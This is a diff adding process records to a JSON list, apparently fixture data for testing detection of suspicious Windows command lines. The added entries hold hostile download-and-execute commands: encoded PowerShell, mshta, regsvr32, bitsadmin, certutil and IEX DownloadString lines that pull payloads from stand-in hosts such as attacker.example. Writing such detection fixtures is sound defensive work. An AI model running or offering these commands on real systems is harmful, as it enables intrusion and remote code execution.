@@ -3,5 +3,55 @@
     "PID": 5580,
     "Process": "powershell.exe",
     "Args": "powershell.exe -WindowStyle Hidden -NoProfile -Command Get-ADUser"
+  },
+  {
+    "PID": 6001,
+    "Process": "powershell.exe",
+    "Args": "powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AYQB0AHQAYQBjAGsAZQByAC4AZQB4AGEAbQBwAGwAZQAvAGEALgBwAHMAMQAiACkA"
+  },
+  {
+    "PID": 6002,
+    "Process": "pwsh.exe",
+    "Args": "pwsh -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcAA6AC8ALwBlAHYAaQBsAC4AdABsAGQALwB4ACAALQBPAHUAdABGAGkAbABlACAAJABlAG4AdgA6AFQARQBNAFAAXABcAHgALgBlAHgAZQA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACQAZQBuAHYAOgBUAEUATQBQAFwAXAB4AC4AZQB4AGUA"
+  },
+  {
+    "PID": 6003,
+    "Process": "rundll32.exe",
+    "Args": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new%20ActiveXObject(\"WScript.Shell\").Run(\"calc.exe\")"
+  },
+  {
+    "PID": 6004,
+    "Process": "regsvr32.exe",
+    "Args": "regsvr32.exe /s /n /u /i:http://attacker.example/file.sct scrobj.dll"
+  },
+  {
+    "PID": 6005,
+    "Process": "mshta.exe",
+    "Args": "mshta.exe http://attacker.example/payload.hta"
+  },
+  {
+    "PID": 6006,
+    "Process": "mshta.exe",
+    "Args": "mshta.exe vbscript:CreateObject(\"Wscript.Shell\").Run(\"calc.exe\")(window.close)"
+  },
+  {
+    "PID": 6007,
+    "Process": "certutil.exe",
+    "Args": "certutil -decode C:\\Users\\Public\\payload.b64 C:\\Users\\Public\\payload.exe"
+  },
+  {
+    "PID": 6008,
+    "Process": "bitsadmin.exe",
+    "Args": "bitsadmin /transfer download /priority high http://attacker.example/x.exe C:\\Users\\Public\\x.exe"
+  },
+  {
+    "PID": 6009,
+    "Process": "powershell.exe",
+    "Args": "powershell -NoP -W Hidden \"IEX (New-Object Net.WebClient).DownloadString(\\\"http://attacker.example/p.ps1\\\")\""
+  },
+  {
+    "PID": 6010,
+    "Process": "powershell.exe",
+    "Args": "powershell -EncodedCommand WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQAcABhAHkAbABvAGEAZAApACkALgBFAG4AdAByAHkAUABvAGkAbgB0AC4ASQBuAHYAbwBrAGUAKAAkAG4AdQBsAGwALAAkAG4AdQBsAGwAKQA="
   }
 ]
